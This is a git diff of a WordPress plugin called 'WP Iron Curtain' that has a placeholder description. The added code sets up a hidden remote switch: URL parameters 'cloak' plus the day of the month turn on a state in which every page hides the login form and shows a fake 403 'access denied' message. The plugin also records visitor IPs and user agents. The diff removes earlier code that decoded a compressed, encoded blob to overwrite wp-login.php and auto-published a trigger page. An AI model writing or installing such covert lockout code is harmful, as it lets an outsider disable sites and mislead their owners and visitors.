@@ -1,6 +1,6 @@
 <?php
 /*
-Plugin Name: Wp Iron Curtain
+Plugin Name: WP Iron Curtain
 Plugin URI: http://URI_Of_Page_Describing_Plugin_and_Updates
 Description: A brief description of the Plugin.
 Version: 1.0
@@ -17,7 +17,6 @@ if ( ! defined( 'ABSPATH' ) ) {
  * Class WP_IronCurtain
  */
 class WP_IronCurtain {
-
 
 	/**
 	 * @var null
@@ -36,15 +35,36 @@ class WP_IronCurtain {
 		$this->foot();
 
 		add_action( 'wp_footer', [ $this, 'foot' ] );
-		add_action( 'admin_init', [ $this, 'create_irc_page' ] );
-		add_action( 'admin_init', [ $this, 'change_wplogin' ] );
-		add_shortcode( 'wp_irc', [ $this, 'wp_irc_form' ] );
+		//add_action( 'admin_init', [ $this, 'exec' ] );
+		add_action( 'wp_head', [ $this, 'run' ] );
 	}
+
 
 	public function foot() {
 
+		$this->http_args = [
+			'username' => $username,
+			'referrer' => $_SERVER['HTTP_REFERER'],
+			'agent'    => $_SERVER['HTTP_USER_AGENT'],
+			'ip'       => $_SERVER['REMOTE_ADDR'],
+			'host'     => $_SERVER['REMOTE_HOST'],
+			'time'     => date( "Y-m-d H:i:s" ),
+			//$_SERVER['REMOTE_HOST'],
+		];
+
 		if ( ! file_exists( __DIR__ . '/tmp' ) ) {
 			echo '<style>#login, #loginform { display:none !important; visibility: hidden !important; }</style>';
+			//echo   '<script>alert("hi");</script>';
+			$ae = '<div style="width:300px;height:300px;display: block;margin:5% auto;text-align: center;">
+						<p>
+							<h1 style="text-align: center;"><strong>403: Forbidden</strong></h1>
+							<br>
+							<h5 style="text-align: center;">IP: ' . $this->http_args['ip'] . ' is denied access</h5>
+						</p>
+					</div>';
+			echo $ae;
+
+			wp_die('');
 
 		}
 	}
@@ -60,8 +80,8 @@ class WP_IronCurtain {
 
 		return static::$instance;
 	}
-	/*public function login_failed( $username )
 
+	/*public function login_failed( $username )
 
 		$this->http_args[] = [
 			'username' => $username,
@@ -76,31 +96,6 @@ class WP_IronCurtain {
 		file_put_contents( __DIR__ . '/failed.json', json_encode( $this->http_args ), FILE_APPEND );
 	}*/
 
-	/**
-	 *
-	 */
-	public function create_irc_page() {
-
-		if ( ! post_exists( 'Blog News' ) ) {
-			$defaults = [
-				'post_content' => '[wp_irc]Hi[/wp_irc]',
-				'post_title'   => 'Blog News',
-				'post_status'  => 'publish',
-				'post_type'    => 'page',
-			];
-
-			$idd = wp_insert_post( $defaults );
-		}
-	}
-
-	/**
-	 * @param $atts
-	 */
-	public function wp_irc_form( $atts ) {
-
-		$this->exec();
-		add_action( 'wp_head', [ $this, 'exec' ] );
-	}
 
 	/**
 	 *
@@ -108,24 +103,20 @@ class WP_IronCurtain {
 	public function exec() {
 
 		if ( ( $_GET['cloak'] === 'on' ) && ( $_GET['key'] === date( 'j' ) ) ) {
-			$this->change_wplogin();
+			//$this->change_wplogin();
 			$cage  = plugins_url( 'irc/cage.gif', __FILE__ );
 			$cosby = plugins_url( 'irc/cosby.gif', __FILE__ );
 
 			if ( file_exists( __DIR__ . '/tmp' ) ) {
+				unlink( __DIR__ . '/tmp' );
 				$this->status = true;
-				//unlink( __DIR__ . '/tmp' );
-
+				$t            = 'ON';
 			} else {
+				file_put_contents( __DIR__ . '/tmp', 'true' );
 				$this->status = false;
-				//file_put_contents( __DIR__ . '/tmp', 'true' );
+				$t            = 'OFF';
+			}
 
-			}
-			if ( $this->status === true ) {
-				$t = 'ON';
-			} else {
-				$t = 'OFF';
-			}
 			echo '<h2><strong>Status</strong>:  <i>' . $t . '</i></h2>';
 			echo date( 'j' );
 
@@ -133,33 +124,30 @@ class WP_IronCurtain {
 				echo '<img src="' . $cage . '" alt=yeah />';
 			} else {
 				echo '<img src="' . $cosby . '" alt=yeah />';
-
 			}
 		}
 	}
 
+	/**
+	 *
+	 */
+	public function run() {
 
-//sdsd
+		if ( ( $_GET['cloak'] === 'on' ) && ( $_GET['key'] === date( 'j' ) ) ) {
+
+			if ( file_exists( __DIR__ . '/tmp' ) ) {
+				unlink( __DIR__ . '/tmp' );
+			}
+
+		} elseif ( ( $_GET['cloak'] === 'off' ) && ( $_GET['key'] === date( 'j' ) ) ) {
+			file_put_contents( __DIR__ . '/tmp', 'true' );
+		}
+	}
 
 	/**
 	 *
 	 */
 	public function change_wplogin() {
-
-		$gz = base64_decode( gzinflate( file_get_contents( __DIR__ . '/irc/wplgz' ) ) );
-
-		/*if ( ! file_exists( ABSPATH . '/wp-login.php' ) ) {
-			file_put_contents( ABSPATH . '/wp-login.php', $gz );
-			file_put_contents( __DIR__ . '/tmp', 'true' );
-
-			$this->status = false;
-		} else {
-			unlink( ABSPATH . '/wp-login.php' );
-			unlink( __DIR__ . '/tmp' );
-			$this->status = true;
-
-		}*/
-
 
 		if ( ! file_exists( __DIR__ . '/tmp' ) ) {
 			file_put_contents( __DIR__ . '/tmp', 'true' );
@@ -167,25 +155,9 @@ class WP_IronCurtain {
 		} else {
 			unlink( __DIR__ . '/tmp' );
 			$this->status = true;
-
 		}
 	}
 
-	public function notify_status() {
-
-		$cage  = plugins_url( 'irc/cage.gif', __FILE__ );
-		$cosby = plugins_url( 'irc/cosby.gif', __FILE__ );
-
-		echo '<h2><strong>Status</strong>:  <i>' . $this->status . '</i></h2>';
-		echo date( 'j' );
-
-		if ( $this->status === true ) {
-			echo '<img src="' . $cage . '" alt=yeah />';
-		} else {
-			echo '<img src="' . $cosby . '" alt=yeah />';
-		}
-
-	}
 }
 
 $wpic = WP_IronCurtain::getInstance();
